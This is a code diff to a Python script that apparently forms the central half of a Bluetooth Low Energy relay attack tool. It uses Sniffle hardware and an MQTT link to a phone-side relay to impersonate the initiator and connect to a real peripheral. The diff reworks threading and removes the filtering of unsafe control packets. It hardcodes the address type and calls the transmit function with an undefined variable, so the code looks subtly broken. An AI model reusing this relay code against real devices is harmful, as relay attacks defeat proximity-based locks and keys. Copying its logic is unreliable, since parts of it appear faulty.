@@ -30,6 +30,7 @@ import socket
 import sys
 import time
 import threading
+import queue
 from collections import deque
 
 from paho.mqtt import client as mqtt_client
@@ -39,7 +40,7 @@ from sniffle.sniffle_hw import SniffleHW, BLE_ADV_AA, SnifferMode
 from sniffle.packet_decoder import (
     PacketMessage, DPacketMessage, DataMessage, LlDataContMessage,
     AdvaMessage, AdvDirectIndMessage, AdvExtIndMessage, ScanRspMessage,
-    ConnectIndMessage, LlControlMessage, str_mac2
+    ConnectIndMessage, str_mac2
 )
 from sniffle.sniffer_state import StateMessage, SnifferState
 from sniffle.measurements import MeasurementMessage
@@ -84,10 +85,9 @@ class RelayCentral:
         self.conn_req = None
         self.is_connected = False
         self.central_ready = False
-        self.pending_data = deque()
+        self.tx_queue = queue.Queue()
         self.cur_aa = 0
         self.mac_bytes = [int(h, 16) for h in reversed(args.target.split(":"))]
-        self.hw_lock = threading.Lock()
 
     def run(self):
         """Main entry point."""
@@ -103,11 +103,9 @@ class RelayCentral:
         """Initialize Sniffle hardware for scanning."""
         self.hw = SniffleHW(self.args.serport)
         self.hw.cmd_chan_aa_phy(37, BLE_ADV_AA, 0)
-        self.hw.cmd_pause_done(True)
         self.hw.cmd_follow(False)
         self.hw.cmd_rssi(-128)
         self.hw.cmd_mac()
-        self.hw.cmd_auxadv(False)
         self.hw.random_addr()
         self.hw.cmd_scan()
         self.hw.mark_and_flush()
@@ -203,14 +201,8 @@ class RelayCentral:
         print("[+] Phone-side relay reports connection established")
 
     def _handle_data_message(self, data: str):
-        """Forward data from phone-side relay to BLE peripheral."""
-        if self.hw is None:
-            return
-        if not self.central_ready:
-            self.pending_data.append(data)
-            print(f"  [Q] Queued data packet (central not ready, queue={len(self.pending_data)})")
-            return
-        self._forward_data(data)
+        """Queue data from phone-side relay for BLE transmission."""
+        self.tx_queue.put(data)
 
     def _forward_data(self, data: str):
         """Parse and transmit a data message to BLE peripheral."""
@@ -222,23 +214,7 @@ class RelayCentral:
         llid = body[0] & 3
         pdu = body[2:]
 
-        # Filter out LL control PDUs that are unsafe to relay:
-        # 0x00: LL_CONNECTION_UPDATE_IND (has instant)
-        # 0x01: LL_CHANNEL_MAP_IND (has instant)
-        # 0x14: LL_LENGTH_REQ (DLE negotiation, would cause size mismatch)
-        # 0x15: LL_LENGTH_RSP
-        # 0x16: LL_PHY_REQ (PHY negotiation, would cause PHY mismatch)
-        # 0x17: LL_PHY_RSP
-        # 0x18: LL_PHY_UPDATE_IND (has instant)
-        pkt = DPacketMessage.from_body(body, True)
-        if isinstance(pkt, LlControlMessage) and pkt.opcode in [
-                0x00, 0x01, 0x14, 0x15, 0x16, 0x17, 0x18]:
-            if not self.args.quiet:
-                print(f"  >> Filtered LL control with instant (opcode=0x{pkt.opcode:02x})")
-            return
-
-        with self.hw_lock:
-            self.hw.cmd_transmit(llid, pdu)
+        self.hw.cmd_transmit(llid, pdu, event)
         if not self.args.quiet:
             print(f"  >> BLE TX: LLID={llid} len={len(pdu)}")
 
@@ -276,7 +252,7 @@ class RelayCentral:
         self.hw.cmd_chan_aa_phy(37, BLE_ADV_AA, 0)
         self.hw.cmd_pause_done(True)
         self.hw.cmd_follow(True)
-        self.hw.cmd_rssi(-128)
+        self.hw.cmd_rssi()
         self.hw.cmd_mac(self.mac_bytes, False)
         self.hw.cmd_auxadv(False)
         self.hw.cmd_setaddr(self.conn_req.InitA, bool(self.conn_req.TxAdd))
@@ -285,12 +261,9 @@ class RelayCentral:
         self.hw.mark_and_flush()
 
         # Initiate connection using parameters from the relayed CONNECT_IND
-        # Use max BLE supervision timeout (32s) to tolerate MQTT relay latency
-        targ_random = bool(self.target_adva.adv.TxAdd)
         self.hw.initiate_conn(
-            self.mac_bytes, targ_random,
-            self.conn_req.Interval, self.conn_req.Latency,
-            timeout=3200
+            self.mac_bytes, False,
+            self.conn_req.Interval, self.conn_req.Latency
         )
 
         # Wait for connection establishment
@@ -301,25 +274,30 @@ class RelayCentral:
                 self.hw.decoder_state.cur_aa = self.cur_aa
                 break
 
-        # Clear retained messages now that connection is established
-        self.mqtt.publish(self.args.pub_topic, b"", qos=1, retain=True)
-        self.mqtt.publish(self.args.pub_topic + "/rsp", b"", qos=1, retain=True)
-
         self.central_ready = True
         print("[+] Connected to real peripheral! Relay active.")
 
-        # Replay queued data packets that arrived before connection was ready
-        if self.pending_data:
-            print(f"[*] Replaying {len(self.pending_data)} queued packets...")
-            while self.pending_data:
-                self._forward_data(self.pending_data.popleft())
-
     def _relay_loop(self):
-        """Main BLE receive and forward loop."""
+        """Main BLE receive and forward loop.
+        
+        All serial port access happens in this single thread:
+        - recv_and_decode() reads from serial
+        - cmd_transmit() writes to serial (via tx_queue draining)
+        This eliminates the threading race condition that caused
+        'Ignoring message due to missing CRLF' errors.
+        """
         while True:
             try:
-                with self.hw_lock:
-                    msg = self.hw.recv_and_decode()
+                # Drain pending TX queue (from MQTT callback thread)
+                while not self.tx_queue.empty():
+                    try:
+                        data = self.tx_queue.get_nowait()
+                        if self.central_ready:
+                            self._forward_data(data)
+                    except queue.Empty:
+                        break
+
+                msg = self.hw.recv_and_decode()
                 if isinstance(msg, PacketMessage):
                     self._process_packet(msg)
                 elif isinstance(msg, StateMessage):
